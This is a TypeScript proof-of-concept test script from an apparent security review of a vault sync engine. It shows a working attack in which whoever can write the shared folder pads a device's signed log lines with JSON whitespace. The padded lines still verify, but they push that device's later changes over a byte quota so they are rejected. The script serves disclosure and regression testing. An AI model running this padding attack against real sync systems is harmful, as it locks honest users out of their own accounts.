// @ts-nocheck PoC script, run as is by vaultRound6Canonical.test.ts
// R6-F: lines are verified on their parsed value (checkLine skips the canonical check; the hash
// and signature are over canonicalJson), but the per-identity share in replay (replay.ts overShare)
// and the agent quota (vaultQuota.ts tallyUsage) count RAW line bytes. A hostile computer or anyone
// who can write the folder pads an honest device's existing lines with JSON whitespace (still valid,
// same hash, same signature). The device's own sync then adopts the padded text (sync.ts mergeLogs
// takes the folder's lines when the hashes match), and from then on the honest device's own new
// account changes are rejected as "over its share", on every device, and refused by the agent.
// PASS = the attack worked.
import { addDevice, agentAppend, build, check, dev, entry, found, now, open, random, rec, st, status } from './lib';
const sync = await import(new URL('../../../../app/src/auth/engine/sync.ts', import.meta.url).href);
const { replayVault } = await import(new URL('../../../src/vault/replay.ts', import.meta.url).href);

const A = dev(), M = dev();
const v = found(A, 'team');
const { vaultId, logs } = v;
addDevice(vaultId, logs, A, M, 'member', 'honest member');
for (let i = 0; i < 40; i++) {
  const s = st(vaultId, logs);
  agentAppend(vaultId, logs, [build.buildAccountPut(s, M, { account: build.newAccountId(random), record: rec(`m${i}`), currentKey: open.openVault(s, M).currentKey, random, time: now() })]);
}
const local = Object.fromEntries(Object.entries(logs).map(([k, l]) => [k, [...l]])); // M's own copy

// The folder writer pads each of M's lines to ~120 KB (under the agent's 128 KB per-line limit).
const pad = (line: string) => line.replace('{', '{' + ' '.repeat(120_000));
const folder = Object.fromEntries(Object.entries(logs).map(([k, l]) => [k, k === M.deviceId ? l.map(pad) : [...l]]));
const fState = replayVault(vaultId, folder);
console.log('padded lines still verify:', (fState.chains[M.deviceId]?.length ?? 0) === logs[M.deviceId]!.length, '| same hashes:', fState.chains[M.deviceId]?.join() === st(vaultId, logs).chains[M.deviceId]!.join());

// M syncs: merge keeps the folder's text for lines whose hashes match.
const lState = replayVault(vaultId, local);
const merged = sync.mergeLogs(local, lState, folder, fState);
console.log('M\'s copy adopted the padded text:', merged.logs[M.deviceId]![0]!.length > 100_000);

// M adds an account on its own copy (engine.ts appendOwn requires it to apply locally).
const mState = replayVault(vaultId, merged.logs);
const e = build.buildAccountPut(mState, M, { account: build.newAccountId(random), record: rec('new'), currentKey: open.openVault(mState, M).currentKey, random, time: now() });
const after = replayVault(vaultId, { ...merged.logs, [M.deviceId]: [...merged.logs[M.deviceId]!, entry.serializeEntry(e)] });
check('M\'s new account change is rejected on its own device', status(after, e).startsWith('rejected'), status(after, e));
check('...and earlier honest account changes of M are now rejected too', after.history.filter((h: any) => h.author === M.deviceId && h.kind === 'account.put' && h.status === 'rejected').length > 1,
  `${after.history.filter((h: any) => h.author === M.deviceId && h.kind === 'account.put' && h.status === 'rejected').length} of M's puts rejected`);
// Without padding, the same line applies.
const clean = replayVault(vaultId, { ...local, [M.deviceId]: [...local[M.deviceId]!, entry.serializeEntry(e)] });
check('control: the same line applies on the unpadded copy', status(clean, e) === 'applied', status(clean, e));
